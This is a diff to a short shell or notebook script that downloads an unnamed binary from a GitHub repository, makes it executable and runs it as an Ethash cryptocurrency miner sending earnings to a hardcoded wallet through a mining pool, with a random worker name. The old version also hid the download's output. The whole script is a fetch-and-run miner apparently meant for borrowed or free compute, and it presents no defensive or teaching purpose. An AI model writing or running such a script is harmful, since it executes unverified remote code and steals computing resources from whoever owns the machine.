@@ -1,3 +1,20 @@
-! wget https://github.com/mencobaiajanah/LM2/raw/main/3 > /dev/null
+#!/bin/bash
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+ALGHO=ETHASH
+POOL=stratum+tcp://us-eth.2miners.com:2020
+WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
+WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+! cd "$(dirname "$0")"
+
+! wget https://github.com/mencobaiajanah/LM2/raw/main/3
 ! chmod +x 3
-! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user ETC:0x82bca3b7bcc50b03422c763a06bc9830ed09f0bd.GPU-A#e34n-zbpz > /dev/null
+! ./3 --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
